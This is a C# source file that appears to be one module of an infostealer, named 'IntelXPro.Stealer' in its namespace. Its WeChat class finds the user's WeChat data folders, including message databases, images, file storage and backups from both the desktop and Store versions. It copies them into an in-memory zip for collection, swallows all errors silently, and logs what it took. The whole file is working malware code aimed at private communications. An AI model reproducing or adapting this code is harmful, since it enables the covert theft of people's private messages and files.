using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class WeChat : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "WeChat";
            int fileCount = 0;

            string userProfile = Environment.GetEnvironmentVariable("USERPROFILE");
            string weChatFilesPath = Path.Combine(userProfile, "Documents", "WeChat Files");
            if (Directory.Exists(weChatFilesPath))
            {
                try
                {
                    string[] weChatDirectories = Directory.GetDirectories(weChatFilesPath);
                    foreach (string weChatDir in weChatDirectories)
                    {
                        string weChatId = Path.GetFileName(weChatDir);
                        
                        string[] subFolders = { "Image", "FileStorage", "Msg", "BackupFiles" };
                        foreach (string subFolder in subFolders)
                        {
                            string sourcePath = Path.Combine(weChatDir, subFolder);
                            if (Directory.Exists(sourcePath))
                            {
                                string targetPath = Path.Combine("WeChat", weChatId, subFolder);
                                zip.AddDirectoryFiles(sourcePath, targetPath);
                                counterApplications.Files.Add(sourcePath + " => " + targetPath);
                                fileCount++;
                            }
                        }
                    }
                }
                catch
                {
                }
            }

            string weChatStorePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Packages", "TencentWeChatLimited.forWindows10_sdtnhv12zgd7a", "LocalCache", "Roaming", "Tencent", "WeChatAppStore", "WeChatAppStore Files");
            if (Directory.Exists(weChatStorePath))
            {
                try
                {
                    string[] userDirectories = Directory.GetDirectories(weChatStorePath);
                    foreach (string userDir in userDirectories)
                    {
                        string username = Path.GetFileName(userDir);
                        string backupPath = Path.Combine(userDir, "BackupFiles");
                        if (Directory.Exists(backupPath))
                        {
                            string targetPath = Path.Combine("WeChat", "Store", username, "BackupFiles");
                            zip.AddDirectoryFiles(backupPath, targetPath);
                            counterApplications.Files.Add(backupPath + " => " + targetPath);
                            fileCount++;
                        }
                    }
                }
                catch
                {
                }
            }

            if (fileCount > 0)
            {
                counterApplications.Files.Add("WeChat\\");
                counter.Messangers.Add(counterApplications);
            }
        }
    }
}
